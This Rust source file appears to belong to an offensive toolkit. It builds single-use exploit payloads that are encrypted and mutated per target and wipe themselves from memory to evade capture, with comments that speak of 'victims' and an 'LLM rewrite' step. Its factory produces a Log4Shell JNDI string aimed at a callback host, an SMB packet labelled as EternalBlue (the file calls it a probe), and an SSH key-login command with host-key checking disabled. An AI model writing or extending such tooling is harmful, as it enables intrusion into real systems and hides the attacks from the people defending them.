// Ephemeral: disposable exploit payloads.
// Exploit code is generated on-the-fly, used once, and never stored.
// After execution, the payload self-destructs from memory.
// Even if the target captures the payload, the next victim gets a different one.
//
// Combined with Weaver mutation + Wax seal + LLM rewrite,
// each exploit payload is unique per target.

use crate::wax;
use tracing::{info, warn};
use uuid::Uuid;

/// A disposable exploit payload that self-destructs after use.
pub struct EphemeralPayload {
    pub id: Uuid,
    pub target: String,
    pub cve: String,
    pub payload: Vec<u8>,        // encrypted + mutated
    pub one_time_key: [u8; 32],  // ChaCha20 key, never stored
    pub used: bool,
}

impl EphemeralPayload {
    /// Create a disposable payload for a specific target.
    /// The payload is wax-sealed (mutated + encrypted) with a one-time key.
    pub fn new(target: &str, cve: &str, raw_payload: &[u8]) -> Self {
        let (key, sealed) = wax::wax_seal(raw_payload);
        Self {
            id: Uuid::new_v4(),
            target: target.to_string(),
            cve: cve.to_string(),
            payload: sealed,
            one_time_key: key,
            used: false,
        }
    }

    /// Deploy the payload to the target.
    /// After deployment, the payload marks itself as used and the key is wiped.
    pub fn deploy(&mut self) -> Option<Vec<u8>> {
        if self.used {
            warn!("EPHEMERAL: payload {} already used, refusing redeploy", self.id);
            return None;
        }

        // Unseal for deployment
        let plaintext = wax::unseal_payload(&self.payload, &self.one_time_key)?;

        info!("EPHEMERAL: deploying {} to {} ({} bytes)",
            self.cve, self.target, plaintext.len());

        self.used = true;
        // Wipe the key
        self.one_time_key = [0u8; 32];
        // Wipe the encrypted payload
        self.payload = vec![0u8; self.payload.len()];

        Some(plaintext)
    }

    /// Verify this payload was specifically crafted for this target.
    pub fn verify_target(&self, expected: &str) -> bool {
        self.target == expected
    }
}

impl Drop for EphemeralPayload {
    fn drop(&mut self) {
        self.one_time_key = [0u8; 32];
        self.payload.clear();
        info!("EPHEMERAL: payload {} self-destructed", self.id);
    }
}

/// Factory for generating disposable exploit payloads.
pub struct EphemeralFactory {
    pub created_count: u32,
    pub deployed_count: u32,
}

impl Default for EphemeralFactory {
    fn default() -> Self {
        Self::new()
    }
}

impl EphemeralFactory {
    pub fn new() -> Self {
        Self { created_count: 0, deployed_count: 0 }
    }

    /// Generate a disposable EternalBlue payload.
    pub fn make_eternalblue(&mut self, target: &str) -> EphemeralPayload {
        let raw = build_smb_payload(target);
        self.created_count += 1;
        EphemeralPayload::new(target, "CVE-2017-0144", &raw)
    }

    /// Generate a disposable Log4Shell payload.
    pub fn make_log4shell(&mut self, target: &str, callback_host: &str) -> EphemeralPayload {
        let raw = format!("${{jndi:ldap://{}/a}}", callback_host).into_bytes();
        self.created_count += 1;
        EphemeralPayload::new(target, "CVE-2021-44228", &raw)
    }

    /// Generate a disposable SSH brute-force payload.
    pub fn make_ssh_brute(&mut self, target: &str, username: &str, key_data: &str) -> EphemeralPayload {
        let raw = format!("ssh -o StrictHostKeyChecking=no -i /dev/stdin {}@{} <<< '{}'", username, target, key_data).into_bytes();
        self.created_count += 1;
        EphemeralPayload::new(target, "SSH_KEY_AUTH", &raw)
    }
}

/// Build a lightweight SMB probe payload (no full exploit, just detection).
fn build_smb_payload(target: &str) -> Vec<u8> {
    // SMB Negotiate Protocol Request (minimal)
    let mut payload = Vec::new();
    payload.extend_from_slice(b"\x00\x00\x00\x85"); // NetBIOS session
    payload.extend_from_slice(b"\xff\x53\x4d\x42");  // SMB magic
    payload.extend_from_slice(b"\x72");               // Negotiate
    payload.extend_from_slice(&[0u8; 4]);             // Status
    payload.extend_from_slice(b"\x00\x00");           // Flags
    payload.extend_from_slice(&[0u8; 12]);            // Flags2 + PID
    payload.extend_from_slice(target.as_bytes());     // Target in payload
    payload
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ephemeral_self_destructs() {
        let mut p = EphemeralPayload::new("test", "CVE-TEST", b"payload");
        assert!(!p.used);
        let _ = p.deploy();
        assert!(p.used);
        // Key should be zeroed
        assert!(p.one_time_key.iter().all(|&b| b == 0));
    }

    #[test]
    fn test_factory_creates_unique_payloads() {
        let mut factory = EphemeralFactory::new();
        let p1 = factory.make_eternalblue("host1");
        let p2 = factory.make_eternalblue("host2");
        assert_ne!(p1.payload, p2.payload);
        assert_eq!(factory.created_count, 2);
    }
}
